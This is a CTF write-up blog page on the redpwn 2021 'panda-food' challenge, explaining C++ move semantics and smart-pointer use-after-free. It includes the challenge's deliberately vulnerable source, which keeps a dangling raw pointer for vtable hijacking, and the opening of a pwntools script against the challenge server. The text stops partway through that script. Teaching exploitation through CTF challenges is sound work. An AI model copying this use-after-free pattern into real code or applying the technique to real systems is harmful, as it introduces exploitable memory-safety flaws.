@@ -1,0 +1,816 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>C++ Smart Pointer UAFs: redpwn 2021's panda-food - 152334H</title><meta name=Description content="Understanding C++ move semantics in the context of a CTF challenge."><meta property="og:title" content="C++ Smart Pointer UAFs: redpwn 2021's panda-food"><meta property="og:description" content="Understanding C++ move semantics in the context of a CTF challenge."><meta property="og:type" content="article"><meta property="og:url" content="https://152334H.github.io/blog/redpwn-2021-panda-food/"><meta property="og:image" content="https://152334H.github.io/undefined.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-07-11T14:17:40+08:00"><meta property="article:modified_time" content="2022-08-20T09:56:31+01:00"><meta property="og:site_name" content="152334H"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://152334H.github.io/undefined.png"><meta name=twitter:title content="C++ Smart Pointer UAFs: redpwn 2021's panda-food"><meta name=twitter:description content="Understanding C++ move semantics in the context of a CTF challenge."><meta name=application-name content="My cool site"><meta name=apple-mobile-web-app-title content="My cool site"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://152334H.github.io/blog/redpwn-2021-panda-food/><link rel=prev href=https://152334H.github.io/blog/icsha-2021-cop/><link rel=next href=https://152334H.github.io/blog/rarctf-2021-the-mound/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"C++ Smart Pointer UAFs: redpwn 2021's panda-food","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/152334H.github.io\/blog\/redpwn-2021-panda-food\/"},"genre":"posts","keywords":"writeup, pwn","wordcount":3712,"url":"https:\/\/152334H.github.io\/blog\/redpwn-2021-panda-food\/","datePublished":"2021-07-11T14:17:40+08:00","dateModified":"2022-08-20T09:56:31+01:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"152334H"},"description":"Understanding C++ move semantics in the context of a CTF challenge."}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"dark"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"dark"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=152334H>Simple Thoughts</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>All Posts </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><a class=menu-item href=/about/><b>About </b></a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
+<input type=text placeholder=Search... id=search-input-desktop>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
+</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=152334H>Simple Thoughts</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=Search... id=search-input-mobile>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/posts/ title>All Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=/about/ title><b>About</b></a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">C++ Smart Pointer UAFs: redpwn 2021's panda-food</h1><h2 class=single-subtitle>Also: inaccurate depictions of `std::basic_string`</h2><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://152334H.github.io/ title=Author target=_blank rel="noopener noreffer author" class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>152334H</a></span>&nbsp;<span class=post-category>included in <a href=/categories/ctf/><i class="far fa-folder fa-fw" aria-hidden=true></i>CTF</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime="July 11, 2021">July 11, 2021</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;3712 words&nbsp;
+<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;18 minutes&nbsp;</div></div><div class="details toc" id=toc-static data-kept=true><div class="details-summary toc-title"><span>Contents</span>
+<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#challenge-details>Challenge details</a></li><li><a href=#exploring>Exploring</a><ul><li><a href=#stdgoogle><code>std::google</code></a></li><li><a href=#testing-the-uaf>Testing the UAF</a></li></ul></li><li><a href=#exploit-hypothesis>Exploit hypothesis</a><ul><li><a href=#better-primitives>Better primitives</a></li><li><a href=#exploitation-minutiae>Exploitation minutiae</a></li></ul></li><li><a href=#footnotes>Footnotes</a></li><li><a href=#tldr>TLDR</a></li><li><a href=#code>Code</a></li></ul></nav></div></div><div class=content id=content><p>Like most beginners in pwn, I&rsquo;ve only a passing familiarity with cpp binary exploits<sup>1</sup>. This writeup targets beginners with little-to-no C++ exploitation background, and you can skip to the <a href=#tldr rel>TL;DR</a> at the end if you just want the solution.</p><h2 id=challenge-details>Challenge details</h2><p>Author: NotDeGhost</p><p>When in doubt, hijack a vtable
+<code>nc mc.ax 31707</code></p><p><strong>Files</strong>: <a href=https://static.redpwn.net/uploads/5cadae788ed9fb0953956a8a8bf48fb3fc30a2b4662ba7e8fbb5dbd6385327ba/Dockerfile target=_blank rel="noopener noreffer">Dockerfile</a> (implies <code>libc6_2.27-3ubuntu1.4_amd64</code>) <a href=https://static.redpwn.net/uploads/8482ec7e87129557889e6cf98a808ad7a63280e9140d87eb4b7961b19e56c66d/Makefile target=_blank rel="noopener noreffer">Makefile</a> ( <code>-O3 -static-libstdc++ -static-libgcc</code>) <a href=https://static.redpwn.net/uploads/27c093ac7d1ea3abf6f69200e6e9eaa6459cc15b95e9124c4450e92324ecb12d/chall target=_blank rel="noopener noreffer">chall</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[*] &#39;chall&#39;
+</span></span><span class=line><span class=cl>    Arch:     amd64-64-little
+</span></span><span class=line><span class=cl>    RELRO:    Full RELRO
+</span></span><span class=line><span class=cl>    Stack:    Canary found
+</span></span><span class=line><span class=cl>    NX:       NX enabled
+</span></span><span class=line><span class=cl>    PIE:      PIE enabled
+</span></span><span class=line><span class=cl>    FORTIFY:  Enabled
+</span></span></code></pre></td></tr></table></div></div><p><a href=https://static.redpwn.net/uploads/db62f9daed24b7953ae93b79356e0920cd362d71c1799c4e07d1615f7b511fa8/chall.cc target=_blank rel="noopener noreffer">chall.cc</a> (slightly minified)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span><span class=lnt>84
+</span><span class=lnt>85
+</span><span class=lnt>86
+</span><span class=lnt>87
+</span><span class=lnt>88
+</span><span class=lnt>89
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;iostream&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;bits/stdc++.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/stat.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Food</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl> <span class=k>public</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>  <span class=n>Food</span><span class=p>(</span><span class=n>std</span><span class=o>::</span><span class=n>string</span> <span class=n>name</span><span class=p>)</span> <span class=o>:</span> <span class=n>name_</span><span class=p>(</span><span class=n>std</span><span class=o>::</span><span class=n>move</span><span class=p>(</span><span class=n>name</span><span class=p>))</span> <span class=p>{}</span>
+</span></span><span class=line><span class=cl>  <span class=k>virtual</span> <span class=kt>void</span> <span class=nf>Eat</span><span class=p>()</span> <span class=p>{</span> <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;om nom nom&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span> <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=kt>void</span> <span class=nf>PrintName</span><span class=p>()</span> <span class=p>{</span> <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;name: &#34;</span> <span class=o>&lt;&lt;</span> <span class=n>name_</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span> <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>string</span> <span class=n>name_</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>};</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Bamboo</span> <span class=o>:</span> <span class=k>public</span> <span class=n>Food</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl> <span class=k>public</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>  <span class=n>Bamboo</span><span class=p>(</span><span class=k>const</span> <span class=n>std</span><span class=o>::</span><span class=n>string</span><span class=o>&amp;&amp;</span> <span class=n>name</span><span class=p>)</span> <span class=o>:</span> <span class=n>Food</span><span class=p>(</span><span class=n>std</span><span class=o>::</span><span class=n>move</span><span class=p>(</span><span class=n>name</span><span class=p>))</span> <span class=p>{}</span>
+</span></span><span class=line><span class=cl>  <span class=k>virtual</span> <span class=kt>void</span> <span class=nf>Eat</span><span class=p>()</span> <span class=p>{</span> <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;crunch crunch&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span> <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>};</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kr>inline</span> <span class=n>size_t</span> <span class=nf>get_idx</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=n>size_t</span> <span class=n>idx</span><span class=p>;</span>
+</span></span><span class=line><span class=cl> <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;idx: &#34;</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>cin</span> <span class=o>&gt;&gt;</span> <span class=n>idx</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>idx</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>uint64_t</span> <span class=nf>rand64</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kt>uint64_t</span> <span class=n>var</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>static</span> <span class=kt>int</span> <span class=n>ufd</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;/dev/urandom&#34;</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>read</span><span class=p>(</span><span class=n>ufd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>var</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>var</span><span class=p>))</span> <span class=o>!=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>var</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>perror</span><span class=p>(</span><span class=s>&#34;ufd read&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>var</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>map</span><span class=o>&lt;</span><span class=n>size_t</span><span class=p>,</span> <span class=n>std</span><span class=o>::</span><span class=n>unique_ptr</span><span class=o>&lt;</span><span class=n>Food</span><span class=o>&gt;&gt;</span> <span class=n>foods</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=n>Food</span><span class=o>*</span> <span class=n>favorite</span> <span class=o>=</span> <span class=k>nullptr</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>choice</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span><span class=nb>true</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;choice: &#34;</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>std</span><span class=o>::</span><span class=n>cin</span> <span class=o>&gt;&gt;</span> <span class=n>choice</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>switch</span> <span class=p>(</span><span class=n>choice</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=k>case</span> <span class=mi>0</span><span class=o>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>size_t</span> <span class=n>idx</span> <span class=o>=</span> <span class=n>get_idx</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>        <span class=n>std</span><span class=o>::</span><span class=n>unique_ptr</span><span class=o>&lt;</span><span class=n>Food</span><span class=o>&gt;</span> <span class=n>tmp</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=n>std</span><span class=o>::</span><span class=n>string</span> <span class=n>name</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;name: &#34;</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=n>std</span><span class=o>::</span><span class=n>cin</span> <span class=o>&gt;&gt;</span> <span class=n>name</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>name</span><span class=p>.</span><span class=n>length</span><span class=p>()</span> <span class=o>&gt;</span> <span class=mh>0x1000</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>          <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;too big :/&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>          <span class=n>_Exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>          <span class=k>if</span> <span class=p>(</span><span class=n>rand64</span><span class=p>()</span> <span class=o>%</span> <span class=mi>2</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=n>tmp</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=n>make_unique</span><span class=o>&lt;</span><span class=n>Bamboo</span><span class=o>&gt;</span><span class=p>(</span><span class=n>std</span><span class=o>::</span><span class=n>move</span><span class=p>(</span><span class=n>name</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>          <span class=k>else</span> <span class=n>tmp</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=n>make_unique</span><span class=o>&lt;</span><span class=n>Food</span><span class=o>&gt;</span><span class=p>(</span><span class=n>std</span><span class=o>::</span><span class=n>move</span><span class=p>(</span><span class=n>name</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>          <span class=n>foods</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=n>move</span><span class=p>(</span><span class=n>tmp</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>      <span class=k>case</span> <span class=mi>1</span><span class=o>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>size_t</span> <span class=n>idx</span> <span class=o>=</span> <span class=n>get_idx</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>        <span class=n>favorite</span> <span class=o>=</span> <span class=n>foods</span><span class=p>[</span><span class=n>idx</span><span class=p>].</span><span class=n>get</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>      <span class=k>case</span> <span class=mi>2</span><span class=o>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>favorite</span><span class=p>)</span> <span class=n>favorite</span><span class=o>-&gt;</span><span class=n>PrintName</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span> <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;set a favorite first!&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>      <span class=k>case</span> <span class=mi>3</span><span class=o>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=n>one_gadget_padding</span><span class=p>[</span><span class=mh>0x100</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>        <span class=n>memset</span><span class=p>(</span><span class=n>one_gadget_padding</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>one_gadget_padding</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>favorite</span><span class=p>)</span> <span class=n>favorite</span><span class=o>-&gt;</span><span class=n>Eat</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span> <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;set a favorite first!&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>      <span class=k>case</span> <span class=mi>4</span><span class=o>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>_Exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Associated I/O glue:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwnscripts</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>string</span> <span class=kn>import</span> <span class=n>whitespace</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=s1>&#39;chall&#39;</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>LOCAL</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>context</span><span class=o>.</span><span class=n>libc</span> <span class=o>=</span> <span class=s1>&#39;libc6_2.27-3ubuntu1.4_amd64&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>process</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span> <span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;mc.ax&#39;</span><span class=p>,</span> <span class=mi>31707</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>optc</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>flush</span><span class=p>():</span> <span class=c1># speed up i/o by deferring recvs until necessary</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>optc</span>
+</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>optc</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;choice: </span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>optc</span> <span class=o>-=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>choose</span><span class=p>(</span><span class=n>opt</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>optc</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>opt</span><span class=p>))</span> <span class=c1># io speed: r.sendlineafter(&#39;choice: \n&#39;, str(opt))</span>
+</span></span><span class=line><span class=cl>    <span class=n>optc</span><span class=o>+=</span><span class=mi>1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sendidx</span><span class=p>(</span><span class=n>idx</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span> <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span> <span class=c1># io speed: r.sendlineafter(&#39;idx: \n&#39;, str(idx))</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>alloc</span><span class=p>(</span><span class=n>idx</span><span class=p>:</span> <span class=nb>int</span><span class=p>,</span> <span class=n>name</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>):</span>
